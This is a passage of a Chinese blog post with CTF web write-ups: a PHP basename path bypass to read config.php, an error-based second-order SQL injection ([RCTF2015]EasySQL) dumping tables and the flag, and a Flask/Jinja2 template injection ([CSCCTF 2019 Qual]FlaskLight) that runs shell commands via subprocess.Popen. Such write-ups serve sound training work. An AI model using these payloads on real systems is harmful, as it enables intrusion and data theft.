+<p>首先告诉我们flag在<code>config.php</code>中，接着发现<code>highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));</code>这串代码，其中<code>$_SERVER[&#39;PHP_SELF&#39;])</code>返回正在执行的脚本名，而<code>basename()</code>返回路径中的文件名部分，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">basename(&quot;/path/home.php&quot;)--&gt;home.php</span><br></pre></td></tr></table></figure>
+
+<p>因此我们可以利用这个函数读取<code>config.php</code>文件，我们访问<code>/index.php/config.php</code>，这样我们访问的是<code>index.php</code>，但经过basename会返回<code>config.php</code>。但正则匹配了这个文件名,因此用不可打印字符绕过，构建payload读取flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/config.php/%ff?souce</span><br></pre></td></tr></table></figure>
+
+<h1 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h1><p>看到注册登录以及提示sql，很明显的二次注入。注册账号时username设置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;mrl64&quot;\</span><br></pre></td></tr></table></figure>
+
+<p>接着发现可以改密码，尝试改密发现报错:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;\&quot; and pwd=&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>因此判断是双引号包裹，推测sql语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username=&quot;&#x27;mrl64&quot;\&quot; and password=&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>因此利用这点在注册出的username进行注入，记得要绕过waf：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||(updatexml(1,concat(0x7e,(select(database())),0x7e),1))#</span><br><span class="line"></span><br><span class="line">//web_sqli</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&quot;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1))#</span><br><span class="line"></span><br><span class="line">//article,flag,users</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&quot;||(updatexml(1,concat(0x7e,(select(concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)&amp;&amp;(column_name)regexp(&#x27;^r&#x27;)),0x7e),1))#</span><br><span class="line"></span><br><span class="line">//real_flag_1s_here</span><br><span class="line">//由于输出长度限制，这里用到了正则匹配使表名完全显示</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)),0x7e),1))#</span><br><span class="line"></span><br><span class="line">//flag&#123;26d9bb05-00be-4bc0-bfcc-03</span><br><span class="line">//无效信息太多导致flag无法显示，因此使用正则匹配</span><br><span class="line"></span><br><span class="line">1&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),0x7e),1))#</span><br><span class="line"></span><br><span class="line">//&#125;d8ea481f9d30-ccfb-0cb4-eb00-50</span><br><span class="line">//由于flag长度限制因此逆序输出后半部分flag</span><br></pre></td></tr></table></figure>
+
+<h1 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h1><p>题目提示我们ssti，接着审查元素发现GET一个search元素，构建payload查找子类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.__class__.__bases__[0].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着用<code>subprocess.Popen</code>进行命令执行，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.__class__.__bases__[0].__subclasses__()[258](&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-write-up-ctf/" rel="tag"># -web -write up -ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/02/18/%E3%80%90hgame-week4%E3%80%91write-up/" rel="next" title="【hgame week4】write up">
+                <i class="fa fa-chevron-left"></i> 【hgame week4】write up
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RoarCTF-2019-Easy-Calc"><span class="nav-number"></span> <span class="nav-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="nav-number"></span> <span class="nav-text">[网鼎杯 2018]Fakebook</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RoarCTF-2019-Easy-Java"><span class="nav-number"></span> <span class="nav-text">[RoarCTF 2019]Easy Java</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BJDCTF2020-EzPHP"><span class="nav-number"></span> <span class="nav-text">[BJDCTF2020]EzPHP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NCTF2019-True-XML-cookbook"><span class="nav-number"></span> <span class="nav-text">[NCTF2019]True XML cookbook</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Zer0pts2020-Can-you-guess-it"><span class="nav-number"></span> <span class="nav-text">[Zer0pts2020]Can you guess it?</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RCTF2015-EasySQL"><span class="nav-number"></span> <span class="nav-text">[RCTF2015]EasySQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CSCCTF-2019-Qual-FlaskLight"><span class="nav-number"></span> <span class="nav-text">[CSCCTF 2019 Qual]FlaskLight</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
